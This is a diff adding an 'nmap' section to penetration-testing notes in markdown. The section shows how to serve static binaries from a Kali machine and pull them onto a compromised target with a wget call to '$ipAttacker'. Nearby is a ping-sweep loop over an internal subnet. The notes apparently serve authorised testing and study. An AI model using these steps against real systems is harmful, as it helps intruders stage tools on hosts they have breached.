@@ -78,6 +78,24 @@ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 ```
 
 
+### nmap
+
+[Binaries repo](https://github.com/andrew-d/static-binaries/tree/master): This repo contains a bunch of statically-linked binaries of various tools, along with the Dockerfiles / other build scripts that can be used to build them. I generally just create these as I need them - not all tools are available for every platform or architecture. 
+```
+# In your kali
+git clone https://github.com/andrew-d/static-binaries.git
+cd /static-binaries/binaries/linux/x86_64
+
+# Serve it to the target:
+python -m http.server 8000
+
+# Copy from the target 
+wget http://$ipAttacker:8000/nmap
+
+# Add executable permissions
+chmod +x nmap
+```
+
 ## 2. Users
 
 ### Kerbrute
